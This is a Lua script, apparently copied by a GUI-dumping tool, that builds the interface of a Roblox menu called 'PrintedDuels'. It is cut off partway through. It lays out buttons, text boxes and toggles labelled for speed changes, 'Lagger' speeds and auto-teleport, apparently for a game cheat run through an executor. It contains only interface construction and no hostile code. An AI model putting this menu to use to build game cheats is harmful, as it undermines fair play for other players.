--[[
    PrintedDuels  (ScreenGui)
    Grabbed by Xavi GUI Copier v1.0.0 on 2026-10-11 20:07:57
    Discord: https://discord.gg/QhWDwSHvK
    736 instances
]]

local G = {}

-- PrintedDuels (ScreenGui)
G.PrintedDuels = Instance.new("ScreenGui")
G.PrintedDuels.Name = "PrintedDuels"
G.PrintedDuels.ResetOnSpawn = false
G.PrintedDuels.DisplayOrder = 10
G.PrintedDuels.IgnoreGuiInset = true
G.PrintedDuels.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets

-- Frame (Frame)
G.Frame = Instance.new("Frame")
G.Frame.BackgroundColor3 = Color3.fromRGB(5, 5, 7)
G.Frame.BorderSizePixel = 0
G.Frame.ClipsDescendants = true
G.Frame.Position = UDim2.new(0, 20, 0, 34)
G.Frame.Size = UDim2.new(0, 380, 0, 440)
G.Frame.Parent = G.PrintedDuels

-- CustomBg (ImageLabel)
G.CustomBg = Instance.new("ImageLabel")
G.CustomBg.Name = "CustomBg"
G.CustomBg.BackgroundTransparency = 1
G.CustomBg.Size = UDim2.new(1, 0, 1, 0)
G.CustomBg.Image = "rbxassetid://88369503310562"
G.CustomBg.ImageTransparency = 0.11999999731779099
G.CustomBg.ScaleType = Enum.ScaleType.Crop
G.CustomBg.Parent = G.Frame

-- UICorner (UICorner)
G.UICorner = Instance.new("UICorner")
G.UICorner.CornerRadius = UDim.new(0, 18)
G.UICorner.Parent = G.CustomBg

-- UICorner_2 (UICorner)
G.UICorner_2 = Instance.new("UICorner")
G.UICorner_2.CornerRadius = UDim.new(0, 18)
G.UICorner_2.Parent = G.Frame

-- UIScale (UIScale)
G.UIScale = Instance.new("UIScale")
G.UIScale.Scale = 0.75
G.UIScale.Parent = G.Frame

-- Frame_2 (Frame)
G.Frame_2 = Instance.new("Frame")
G.Frame_2.BackgroundColor3 = Color3.fromRGB(9, 9, 13)
G.Frame_2.BorderSizePixel = 0
G.Frame_2.Size = UDim2.new(1, 0, 0, 62)
G.Frame_2.ZIndex = 5
G.Frame_2.Parent = G.Frame

-- UICorner_3 (UICorner)
G.UICorner_3 = Instance.new("UICorner")
G.UICorner_3.CornerRadius = UDim.new(0, 12)
G.UICorner_3.Parent = G.Frame_2

-- TextLabel (TextLabel)
G.TextLabel = Instance.new("TextLabel")
G.TextLabel.BackgroundTransparency = 1
G.TextLabel.Position = UDim2.new(0, 12, 0, 6)
G.TextLabel.Size = UDim2.new(0, 240, 0, 28)
G.TextLabel.ZIndex = 6
G.TextLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel.RichText = true
G.TextLabel.Text = "<font color=\"#FFFFFF\">PRINTED</font> <font color=\"#288CFF\">DUELS</font>"
G.TextLabel.TextSize = 24
G.TextLabel.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel.Parent = G.Frame_2

-- TextLabel_2 (TextLabel)
G.TextLabel_2 = Instance.new("TextLabel")
G.TextLabel_2.BackgroundTransparency = 1
G.TextLabel_2.Position = UDim2.new(0, 12, 0, 32)
G.TextLabel_2.Size = UDim2.new(1, -130, 0, 16)
G.TextLabel_2.ZIndex = 6
G.TextLabel_2.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G.TextLabel_2.Text = "discord.gg/printed  |  Delta"
G.TextLabel_2.TextColor3 = Color3.fromRGB(150, 155, 170)
G.TextLabel_2.TextSize = 11
G.TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_2.Parent = G.Frame_2

-- TextButton (TextButton)
G.TextButton = Instance.new("TextButton")
G.TextButton.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
G.TextButton.BorderSizePixel = 0
G.TextButton.Position = UDim2.new(1, -148, 0, 10)
G.TextButton.Size = UDim2.new(0, 32, 0, 22)
G.TextButton.ZIndex = 7
G.TextButton.AutoButtonColor = false
G.TextButton.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton.Text = "UI"
G.TextButton.TextColor3 = Color3.fromRGB(230, 230, 235)
G.TextButton.TextSize = 11
G.TextButton:SetAttribute("PrintedSoundWired", true)
G.TextButton.Parent = G.Frame_2

-- UICorner_4 (UICorner)
G.UICorner_4 = Instance.new("UICorner")
G.UICorner_4.CornerRadius = UDim.new(1, 0)
G.UICorner_4.Parent = G.TextButton

-- UIStroke (UIStroke)
G.UIStroke = Instance.new("UIStroke")
G.UIStroke.Color = Color3.fromRGB(55, 55, 65)
G.UIStroke.Parent = G.TextButton

-- TextButton_2 (TextButton)
G.TextButton_2 = Instance.new("TextButton")
G.TextButton_2.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
G.TextButton_2.BorderSizePixel = 0
G.TextButton_2.Position = UDim2.new(1, -112, 0, 10)
G.TextButton_2.Size = UDim2.new(0, 72, 0, 22)
G.TextButton_2.ZIndex = 7
G.TextButton_2.AutoButtonColor = false
G.TextButton_2.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_2.Text = "LOCKED"
G.TextButton_2.TextColor3 = Color3.fromRGB(230, 230, 235)
G.TextButton_2.TextSize = 10
G.TextButton_2:SetAttribute("PrintedSoundWired", true)
G.TextButton_2.Parent = G.Frame_2

-- UICorner_5 (UICorner)
G.UICorner_5 = Instance.new("UICorner")
G.UICorner_5.CornerRadius = UDim.new(1, 0)
G.UICorner_5.Parent = G.TextButton_2

-- UIStroke_2 (UIStroke)
G.UIStroke_2 = Instance.new("UIStroke")
G.UIStroke_2.Color = Color3.fromRGB(55, 55, 65)
G.UIStroke_2.Parent = G.TextButton_2

-- TextButton_3 (TextButton)
G.TextButton_3 = Instance.new("TextButton")
G.TextButton_3.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
G.TextButton_3.BorderSizePixel = 0
G.TextButton_3.Position = UDim2.new(1, -40, 0, 6)
G.TextButton_3.Size = UDim2.new(0, 34, 0, 34)
G.TextButton_3.ZIndex = 7
G.TextButton_3.AutoButtonColor = false
G.TextButton_3.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_3.Text = "X"
G.TextButton_3.TextColor3 = Color3.fromRGB(170, 170, 170)
G.TextButton_3.TextSize = 20
G.TextButton_3:SetAttribute("PrintedSoundWired", true)
G.TextButton_3.Parent = G.Frame_2

-- UICorner_6 (UICorner)
G.UICorner_6 = Instance.new("UICorner")
G.UICorner_6.CornerRadius = UDim.new(1, 0)
G.UICorner_6.Parent = G.TextButton_3

-- Pages (Frame)
G.Pages = Instance.new("Frame")
G.Pages.Name = "Pages"
G.Pages.BackgroundTransparency = 1
G.Pages.BorderSizePixel = 0
G.Pages.ClipsDescendants = true
G.Pages.Position = UDim2.new(0, 6, 0, 62)
G.Pages.Size = UDim2.new(1, -110, 1, -68)
G.Pages.Parent = G.Frame

-- Page1 (ScrollingFrame)
G.Page1 = Instance.new("ScrollingFrame")
G.Page1.Name = "Page1"
G.Page1.BackgroundTransparency = 1
G.Page1.BorderSizePixel = 0
G.Page1.Size = UDim2.new(1, 0, 1, 0)
G.Page1.AutomaticCanvasSize = Enum.AutomaticSize.Y
G.Page1.CanvasSize = UDim2.new(0, 0, 0, 0)
G.Page1.ScrollBarImageTransparency = 1
G.Page1.ScrollBarThickness = 0
G.Page1.Parent = G.Pages

-- UIListLayout (UIListLayout)
G.UIListLayout = Instance.new("UIListLayout")
G.UIListLayout.Padding = UDim.new(0, 3)
G.UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
G.UIListLayout.Parent = G.Page1

-- UIPadding (UIPadding)
G.UIPadding = Instance.new("UIPadding")
G.UIPadding.PaddingBottom = UDim.new(0, 10)
G.UIPadding.PaddingLeft = UDim.new(0, 7)
G.UIPadding.PaddingRight = UDim.new(0, 7)
G.UIPadding.PaddingTop = UDim.new(0, 7)
G.UIPadding.Parent = G.Page1

-- TabAnimScale (UIScale)
G.TabAnimScale = Instance.new("UIScale")
G.TabAnimScale.Name = "TabAnimScale"
G.TabAnimScale.Parent = G.Page1

-- Frame_3 (Frame)
G.Frame_3 = Instance.new("Frame")
G.Frame_3.BackgroundTransparency = 1
G.Frame_3.BorderSizePixel = 0
G.Frame_3.LayoutOrder = 1
G.Frame_3.Size = UDim2.new(1, 0, 0, 38)
G.Frame_3.Parent = G.Page1

-- TextLabel_3 (TextLabel)
G.TextLabel_3 = Instance.new("TextLabel")
G.TextLabel_3.BackgroundTransparency = 1
G.TextLabel_3.Position = UDim2.new(0, 8, 0, 6)
G.TextLabel_3.Size = UDim2.new(1, -12, 0, 24)
G.TextLabel_3.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_3.Text = "SPEED"
G.TextLabel_3.TextColor3 = Color3.fromRGB(245, 245, 250)
G.TextLabel_3.TextSize = 15
G.TextLabel_3.TextStrokeTransparency = 0.85000002384185791
G.TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_3.Parent = G.Frame_3

-- Frame_4 (Frame)
G.Frame_4 = Instance.new("Frame")
G.Frame_4.BackgroundColor3 = Color3.fromRGB(70, 120, 220)
G.Frame_4.BackgroundTransparency = 0.34999999403953552
G.Frame_4.BorderSizePixel = 0
G.Frame_4.Position = UDim2.new(0, 8, 1, -4)
G.Frame_4.Size = UDim2.new(1, -16, 0, 2)
G.Frame_4.Parent = G.Frame_3

-- Frame_5 (Frame)
G.Frame_5 = Instance.new("Frame")
G.Frame_5.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_5.BorderSizePixel = 0
G.Frame_5.ClipsDescendants = true
G.Frame_5.LayoutOrder = 2
G.Frame_5.Size = UDim2.new(1, 0, 0, 32)
G.Frame_5.Parent = G.Page1

-- UICorner_7 (UICorner)
G.UICorner_7 = Instance.new("UICorner")
G.UICorner_7.CornerRadius = UDim.new(0, 14)
G.UICorner_7.Parent = G.Frame_5

-- UIStroke_3 (UIStroke)
G.UIStroke_3 = Instance.new("UIStroke")
G.UIStroke_3.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_3.Parent = G.Frame_5

-- TextLabel_4 (TextLabel)
G.TextLabel_4 = Instance.new("TextLabel")
G.TextLabel_4.BackgroundTransparency = 1
G.TextLabel_4.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_4.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_4.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_4.Text = "Normal Speed"
G.TextLabel_4.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_4.TextSize = 14
G.TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_4.Parent = G.Frame_5

-- TextBox (TextBox)
G.TextBox = Instance.new("TextBox")
G.TextBox.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
G.TextBox.BorderSizePixel = 0
G.TextBox.Position = UDim2.new(1, -48, 0.5, -11)
G.TextBox.Size = UDim2.new(0, 50, 0, 22)
G.TextBox.ZIndex = 5
G.TextBox.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextBox.Text = "60"
G.TextBox.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextBox.TextSize = 11
G.TextBox.ClearTextOnFocus = false
G.TextBox.Parent = G.Frame_5

-- UICorner_8 (UICorner)
G.UICorner_8 = Instance.new("UICorner")
G.UICorner_8.CornerRadius = UDim.new(1, 0)
G.UICorner_8.Parent = G.TextBox

-- UIStroke_4 (UIStroke)
G.UIStroke_4 = Instance.new("UIStroke")
G.UIStroke_4.Color = Color3.fromRGB(30, 30, 38)
G.UIStroke_4.Parent = G.TextBox

-- Frame_6 (Frame)
G.Frame_6 = Instance.new("Frame")
G.Frame_6.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_6.BorderSizePixel = 0
G.Frame_6.ClipsDescendants = true
G.Frame_6.LayoutOrder = 3
G.Frame_6.Size = UDim2.new(1, 0, 0, 32)
G.Frame_6.Parent = G.Page1

-- UICorner_9 (UICorner)
G.UICorner_9 = Instance.new("UICorner")
G.UICorner_9.CornerRadius = UDim.new(0, 14)
G.UICorner_9.Parent = G.Frame_6

-- UIStroke_5 (UIStroke)
G.UIStroke_5 = Instance.new("UIStroke")
G.UIStroke_5.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_5.Parent = G.Frame_6

-- TextLabel_5 (TextLabel)
G.TextLabel_5 = Instance.new("TextLabel")
G.TextLabel_5.BackgroundTransparency = 1
G.TextLabel_5.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_5.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_5.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_5.Text = "Carry Speed"
G.TextLabel_5.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_5.TextSize = 14
G.TextLabel_5.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_5.Parent = G.Frame_6

-- TextBox_2 (TextBox)
G.TextBox_2 = Instance.new("TextBox")
G.TextBox_2.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
G.TextBox_2.BorderSizePixel = 0
G.TextBox_2.Position = UDim2.new(1, -48, 0.5, -11)
G.TextBox_2.Size = UDim2.new(0, 50, 0, 22)
G.TextBox_2.ZIndex = 5
G.TextBox_2.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextBox_2.Text = "28.9"
G.TextBox_2.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextBox_2.TextSize = 11
G.TextBox_2.ClearTextOnFocus = false
G.TextBox_2.Parent = G.Frame_6

-- UICorner_10 (UICorner)
G.UICorner_10 = Instance.new("UICorner")
G.UICorner_10.CornerRadius = UDim.new(1, 0)
G.UICorner_10.Parent = G.TextBox_2

-- UIStroke_6 (UIStroke)
G.UIStroke_6 = Instance.new("UIStroke")
G.UIStroke_6.Color = Color3.fromRGB(30, 30, 38)
G.UIStroke_6.Parent = G.TextBox_2

-- Frame_7 (Frame)
G.Frame_7 = Instance.new("Frame")
G.Frame_7.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_7.BorderSizePixel = 0
G.Frame_7.ClipsDescendants = true
G.Frame_7.LayoutOrder = 4
G.Frame_7.Size = UDim2.new(1, 0, 0, 32)
G.Frame_7.Parent = G.Page1

-- UICorner_11 (UICorner)
G.UICorner_11 = Instance.new("UICorner")
G.UICorner_11.CornerRadius = UDim.new(0, 14)
G.UICorner_11.Parent = G.Frame_7

-- UIStroke_7 (UIStroke)
G.UIStroke_7 = Instance.new("UIStroke")
G.UIStroke_7.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_7.Parent = G.Frame_7

-- TextLabel_6 (TextLabel)
G.TextLabel_6 = Instance.new("TextLabel")
G.TextLabel_6.BackgroundTransparency = 1
G.TextLabel_6.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_6.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_6.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_6.Text = "Lagger Normal Speed"
G.TextLabel_6.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_6.TextSize = 14
G.TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_6.Parent = G.Frame_7

-- TextBox_3 (TextBox)
G.TextBox_3 = Instance.new("TextBox")
G.TextBox_3.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
G.TextBox_3.BorderSizePixel = 0
G.TextBox_3.Position = UDim2.new(1, -48, 0.5, -11)
G.TextBox_3.Size = UDim2.new(0, 50, 0, 22)
G.TextBox_3.ZIndex = 5
G.TextBox_3.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextBox_3.Text = "15"
G.TextBox_3.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextBox_3.TextSize = 11
G.TextBox_3.ClearTextOnFocus = false
G.TextBox_3.Parent = G.Frame_7

-- UICorner_12 (UICorner)
G.UICorner_12 = Instance.new("UICorner")
G.UICorner_12.CornerRadius = UDim.new(1, 0)
G.UICorner_12.Parent = G.TextBox_3

-- UIStroke_8 (UIStroke)
G.UIStroke_8 = Instance.new("UIStroke")
G.UIStroke_8.Color = Color3.fromRGB(30, 30, 38)
G.UIStroke_8.Parent = G.TextBox_3

-- Frame_8 (Frame)
G.Frame_8 = Instance.new("Frame")
G.Frame_8.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_8.BorderSizePixel = 0
G.Frame_8.ClipsDescendants = true
G.Frame_8.LayoutOrder = 5
G.Frame_8.Size = UDim2.new(1, 0, 0, 32)
G.Frame_8.Parent = G.Page1

-- UICorner_13 (UICorner)
G.UICorner_13 = Instance.new("UICorner")
G.UICorner_13.CornerRadius = UDim.new(0, 14)
G.UICorner_13.Parent = G.Frame_8

-- UIStroke_9 (UIStroke)
G.UIStroke_9 = Instance.new("UIStroke")
G.UIStroke_9.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_9.Parent = G.Frame_8

-- TextLabel_7 (TextLabel)
G.TextLabel_7 = Instance.new("TextLabel")
G.TextLabel_7.BackgroundTransparency = 1
G.TextLabel_7.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_7.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_7.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_7.Text = "Lagger Carry Speed"
G.TextLabel_7.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_7.TextSize = 14
G.TextLabel_7.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_7.Parent = G.Frame_8

-- TextBox_4 (TextBox)
G.TextBox_4 = Instance.new("TextBox")
G.TextBox_4.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
G.TextBox_4.BorderSizePixel = 0
G.TextBox_4.Position = UDim2.new(1, -48, 0.5, -11)
G.TextBox_4.Size = UDim2.new(0, 50, 0, 22)
G.TextBox_4.ZIndex = 5
G.TextBox_4.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextBox_4.Text = "24.5"
G.TextBox_4.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextBox_4.TextSize = 11
G.TextBox_4.ClearTextOnFocus = false
G.TextBox_4.Parent = G.Frame_8

-- UICorner_14 (UICorner)
G.UICorner_14 = Instance.new("UICorner")
G.UICorner_14.CornerRadius = UDim.new(1, 0)
G.UICorner_14.Parent = G.TextBox_4

-- UIStroke_10 (UIStroke)
G.UIStroke_10 = Instance.new("UIStroke")
G.UIStroke_10.Color = Color3.fromRGB(30, 30, 38)
G.UIStroke_10.Parent = G.TextBox_4

-- Frame_9 (Frame)
G.Frame_9 = Instance.new("Frame")
G.Frame_9.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_9.BorderSizePixel = 0
G.Frame_9.ClipsDescendants = true
G.Frame_9.LayoutOrder = 6
G.Frame_9.Size = UDim2.new(1, 0, 0, 40)
G.Frame_9.Parent = G.Page1

-- UICorner_15 (UICorner)
G.UICorner_15 = Instance.new("UICorner")
G.UICorner_15.CornerRadius = UDim.new(0, 14)
G.UICorner_15.Parent = G.Frame_9

-- UIStroke_11 (UIStroke)
G.UIStroke_11 = Instance.new("UIStroke")
G.UIStroke_11.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_11.Parent = G.Frame_9

-- TextLabel_8 (TextLabel)
G.TextLabel_8 = Instance.new("TextLabel")
G.TextLabel_8.BackgroundTransparency = 1
G.TextLabel_8.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_8.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_8.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_8.Text = "Auto Carry Speed"
G.TextLabel_8.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_8.TextSize = 14
G.TextLabel_8.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_8.Parent = G.Frame_9

-- Frame_10 (Frame)
G.Frame_10 = Instance.new("Frame")
G.Frame_10.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
G.Frame_10.BorderSizePixel = 0
G.Frame_10.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_10.Size = UDim2.new(0, 46, 0, 24)
G.Frame_10.ZIndex = 3
G.Frame_10.Parent = G.Frame_9

-- UICorner_16 (UICorner)
G.UICorner_16 = Instance.new("UICorner")
G.UICorner_16.CornerRadius = UDim.new(1, 0)
G.UICorner_16.Parent = G.Frame_10

-- Frame_11 (Frame)
G.Frame_11 = Instance.new("Frame")
G.Frame_11.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
G.Frame_11.BorderSizePixel = 0
G.Frame_11.Position = UDim2.new(0, 3, 0.5, -9)
G.Frame_11.Size = UDim2.new(0, 18, 0, 18)
G.Frame_11.ZIndex = 4
G.Frame_11.Parent = G.Frame_10

-- UICorner_17 (UICorner)
G.UICorner_17 = Instance.new("UICorner")
G.UICorner_17.CornerRadius = UDim.new(1, 0)
G.UICorner_17.Parent = G.Frame_11

-- TextButton_4 (TextButton)
G.TextButton_4 = Instance.new("TextButton")
G.TextButton_4.BackgroundTransparency = 1
G.TextButton_4.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_4.ZIndex = 5
G.TextButton_4.AutoButtonColor = false
G.TextButton_4.Text = ""
G.TextButton_4:SetAttribute("PrintedSoundWired", true)
G.TextButton_4.Parent = G.Frame_10

-- Frame_12 (Frame)
G.Frame_12 = Instance.new("Frame")
G.Frame_12.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_12.BorderSizePixel = 0
G.Frame_12.ClipsDescendants = true
G.Frame_12.LayoutOrder = 7
G.Frame_12.Size = UDim2.new(1, 0, 0, 32)
G.Frame_12.Parent = G.Page1

-- UICorner_18 (UICorner)
G.UICorner_18 = Instance.new("UICorner")
G.UICorner_18.CornerRadius = UDim.new(0, 14)
G.UICorner_18.Parent = G.Frame_12

-- UIStroke_12 (UIStroke)
G.UIStroke_12 = Instance.new("UIStroke")
G.UIStroke_12.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_12.Parent = G.Frame_12

-- TextLabel_9 (TextLabel)
G.TextLabel_9 = Instance.new("TextLabel")
G.TextLabel_9.BackgroundTransparency = 1
G.TextLabel_9.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_9.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_9.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_9.Text = "Mode"
G.TextLabel_9.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_9.TextSize = 14
G.TextLabel_9.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_9.Parent = G.Frame_12

-- TextLabel_10 (TextLabel)
G.TextLabel_10 = Instance.new("TextLabel")
G.TextLabel_10.BackgroundTransparency = 1
G.TextLabel_10.Position = UDim2.new(1, -94, 0, 0)
G.TextLabel_10.Size = UDim2.new(0, 90, 1, 0)
G.TextLabel_10.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_10.Text = "Normal"
G.TextLabel_10.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_10.TextSize = 11
G.TextLabel_10.TextXAlignment = Enum.TextXAlignment.Right
G.TextLabel_10.Parent = G.Frame_12

-- TextButton_5 (TextButton)
G.TextButton_5 = Instance.new("TextButton")
G.TextButton_5.BackgroundTransparency = 1
G.TextButton_5.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_5.ZIndex = 2
G.TextButton_5.Text = ""
G.TextButton_5:SetAttribute("PrintedSoundWired", true)
G.TextButton_5.Parent = G.Frame_12

-- Frame_13 (Frame)
G.Frame_13 = Instance.new("Frame")
G.Frame_13.BackgroundTransparency = 1
G.Frame_13.BorderSizePixel = 0
G.Frame_13.LayoutOrder = 61
G.Frame_13.Size = UDim2.new(1, 0, 0, 38)
G.Frame_13.Parent = G.Page1

-- TextLabel_11 (TextLabel)
G.TextLabel_11 = Instance.new("TextLabel")
G.TextLabel_11.BackgroundTransparency = 1
G.TextLabel_11.Position = UDim2.new(0, 8, 0, 6)
G.TextLabel_11.Size = UDim2.new(1, -12, 0, 24)
G.TextLabel_11.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_11.Text = "SPEED"
G.TextLabel_11.TextColor3 = Color3.fromRGB(245, 245, 250)
G.TextLabel_11.TextSize = 15
G.TextLabel_11.TextStrokeTransparency = 0.85000002384185791
G.TextLabel_11.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_11.Parent = G.Frame_13

-- Frame_14 (Frame)
G.Frame_14 = Instance.new("Frame")
G.Frame_14.BackgroundColor3 = Color3.fromRGB(70, 120, 220)
G.Frame_14.BackgroundTransparency = 0.34999999403953552
G.Frame_14.BorderSizePixel = 0
G.Frame_14.Position = UDim2.new(0, 8, 1, -4)
G.Frame_14.Size = UDim2.new(1, -16, 0, 2)
G.Frame_14.Parent = G.Frame_13

-- Frame_15 (Frame)
G.Frame_15 = Instance.new("Frame")
G.Frame_15.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_15.BorderSizePixel = 0
G.Frame_15.ClipsDescendants = true
G.Frame_15.LayoutOrder = 62
G.Frame_15.Size = UDim2.new(1, 0, 0, 40)
G.Frame_15.Parent = G.Page1

-- UICorner_19 (UICorner)
G.UICorner_19 = Instance.new("UICorner")
G.UICorner_19.CornerRadius = UDim.new(0, 14)
G.UICorner_19.Parent = G.Frame_15

-- UIStroke_13 (UIStroke)
G.UIStroke_13 = Instance.new("UIStroke")
G.UIStroke_13.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_13.Parent = G.Frame_15

-- TextLabel_12 (TextLabel)
G.TextLabel_12 = Instance.new("TextLabel")
G.TextLabel_12.BackgroundTransparency = 1
G.TextLabel_12.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_12.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_12.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_12.Text = "Auto TP"
G.TextLabel_12.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_12.TextSize = 14
G.TextLabel_12.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_12.Parent = G.Frame_15

-- Frame_16 (Frame)
G.Frame_16 = Instance.new("Frame")
G.Frame_16.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
G.Frame_16.BorderSizePixel = 0
G.Frame_16.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_16.Size = UDim2.new(0, 46, 0, 24)
G.Frame_16.ZIndex = 3
G.Frame_16.Parent = G.Frame_15

-- UICorner_20 (UICorner)
G.UICorner_20 = Instance.new("UICorner")
G.UICorner_20.CornerRadius = UDim.new(1, 0)
G.UICorner_20.Parent = G.Frame_16

-- Frame_17 (Frame)
G.Frame_17 = Instance.new("Frame")
G.Frame_17.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
G.Frame_17.BorderSizePixel = 0
G.Frame_17.Position = UDim2.new(0, 3, 0.5, -9)
G.Frame_17.Size = UDim2.new(0, 18, 0, 18)
G.Frame_17.ZIndex = 4
G.Frame_17.Parent = G.Frame_16

-- UICorner_21 (UICorner)
G.UICorner_21 = Instance.new("UICorner")
G.UICorner_21.CornerRadius = UDim.new(1, 0)
G.UICorner_21.Parent = G.Frame_17

-- TextButton_6 (TextButton)
G.TextButton_6 = Instance.new("TextButton")
G.TextButton_6.BackgroundTransparency = 1
G.TextButton_6.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_6.ZIndex = 5
G.TextButton_6.AutoButtonColor = false
G.TextButton_6.Text = ""
G.TextButton_6:SetAttribute("PrintedSoundWired", true)
G.TextButton_6.Parent = G.Frame_16

-- Frame_18 (Frame)
G.Frame_18 = Instance.new("Frame")
G.Frame_18.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_18.BorderSizePixel = 0
G.Frame_18.ClipsDescendants = true
G.Frame_18.LayoutOrder = 63
G.Frame_18.Size = UDim2.new(1, 0, 0, 40)
G.Frame_18.Parent = G.Page1

-- UICorner_22 (UICorner)
G.UICorner_22 = Instance.new("UICorner")
G.UICorner_22.CornerRadius = UDim.new(0, 14)
G.UICorner_22.Parent = G.Frame_18

-- UIStroke_14 (UIStroke)
G.UIStroke_14 = Instance.new("UIStroke")
G.UIStroke_14.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_14.Parent = G.Frame_18

-- TextLabel_13 (TextLabel)
G.TextLabel_13 = Instance.new("TextLabel")
